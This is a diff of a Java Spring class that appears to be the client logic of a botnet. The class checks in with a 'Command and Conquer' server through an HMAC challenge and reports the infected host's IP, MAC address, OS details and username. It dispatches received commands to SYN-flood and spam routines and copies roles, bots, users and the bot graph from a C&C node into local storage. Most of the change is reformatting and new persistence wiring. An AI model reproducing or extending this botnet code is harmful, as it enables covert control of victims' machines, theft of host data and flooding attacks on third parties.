@@ -21,9 +21,13 @@ import org.springframework.stereotype.Service;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 import cs.sii.domain.SyncIpList;
+import cs.sii.model.role.Role;
 import cs.sii.network.request.BotRequest;
 import cs.sii.service.connection.NetworkService;
 import cs.sii.service.crypto.CryptoPKI;
+import cs.sii.service.dao.BotServiceImpl;
+import cs.sii.service.dao.RoleServiceImpl;
+import cs.sii.service.dao.UserServiceImpl;
 
 @Service
 public class Behavior {
@@ -42,8 +46,16 @@ public class Behavior {
 
 	@Autowired
 	private Malicious malS;
-	
-	
+
+	@Autowired
+	private BotServiceImpl bServ;
+
+	@Autowired
+	private RoleServiceImpl rServ;
+
+	@Autowired
+	private UserServiceImpl uServ;
+
 	// Il secondo valore è vuoto però ci serviva una lista sincata per non
 	// implementarla di nuovo
 	@Autowired
@@ -69,13 +81,12 @@ public class Behavior {
 		String data = nServ.getIdHash();
 
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
-		List<Pairs<String, String>>  response=null;
-		response=req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(),data);
-		if(response!=null){
-			response.forEach(ob->System.out.println("torno2 " + ob.getValue1().toString()));
-		}else
+		List<Pairs<String, String>> response = null;
+		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
+		if (response != null) {
+			response.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
+		} else
 			System.out.println("torno null");
-		
 
 	}
 
@@ -86,22 +97,15 @@ public class Behavior {
 	 */
 	private boolean challengeToCommandConquer() {
 		System.out.println("IP C&C " + nServ.getCommandConquerIps().getList().get(0).getValue1());
-		Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),nServ.getCommandConquerIps().getList().get(0).getValue1());
+		Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
+				nServ.getCommandConquerIps().getList().get(0).getValue1());
 		if (challenge != null) {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
-			String response = req.getResponseFromCeC(
-					nServ.getIdHash(), 
-					nServ.getMyIp(), 
-					nServ.getMac(),
-					nServ.getOs(), 
-					nServ.getVersionOS(), 
-					nServ.getArchOS(), 
-					nServ.getUsernameOS(),
-					nServ.getCommandConquerIps().getList().get(0).getValue1(), 
-					hashMac, 
-					pki.getPubRSAKey(),
+			String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(),
+					nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
+					nServ.getCommandConquerIps().getList().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
 					nServ.isElegible());
 			System.out.println("La risposta del CeC: " + response);
 		}
@@ -194,15 +198,15 @@ public class Behavior {
 
 	}
 
-	//TODO definire attacchi
+	// TODO definire attacchi
 	@Async
 	private void executeCommand(String msg) {
 		switch (msg) {
 		case "synflood":
-				malS.synFlood(msg);
+			malS.synFlood(msg);
 			break;
 		case "spam":
-				malS.spam(msg);
+			malS.spam(msg);
 			break;
 		case "search file":
 
@@ -232,25 +236,30 @@ public class Behavior {
 	 */
 	@Async
 	public void getPower(String ip) {
+
+		// prendo il db = ip
+
+		// richiesta ruoli(List<? super Customer>)
+
+		List<Object> roles = req.getObject(ip, "1");
+		rServ.saveAllObj(roles);
+		roles.forEach(role -> System.out.println("ruolo: " + role));
+		// richiesta bots
+		List<Object> bots = req.getObject(ip, "2");
+		bServ.saveObj(bots);
+		bots.forEach(bot -> System.out.println("bots: " + bot));
+		// richiesta users
+		List<Object> users = req.getObject(ip, "3");
+		uServ.saveAllObj(users);
 		
-		//prendo il db = ip
+		users.forEach(user -> System.out.println("users: " + user));
+		// prendo grafo
+		List<Object> graph = req.getObject(ip, "4");
 		
-			//richiesta ruoli
-		
-			List<Object> roles = req.getObject(ip, "1");
-			roles.forEach(role->System.out.println("ruolo: "+role));
-			//richiesta utenti
-			List<Object> users = req.getObject(ip, "2");
-			users.forEach(user->System.out.println("user: "+user));
-			//richiesta bot
-			List<Object> bots =req.getObject(ip, "3");
-			bots.forEach(role->System.out.println("bots: "+role));
-			//prendo grafo
-			List<Object> graph =req.getObject(ip, "4");
-			graph.forEach(role->System.out.println("edges: "+role));
-		//informo cc vecchio che spnp ready
+		graph.forEach(role -> System.out.println("edges: " + role));
+		// informo cc vecchio che spnp ready
 		//
-		
+
 	}
 }
 
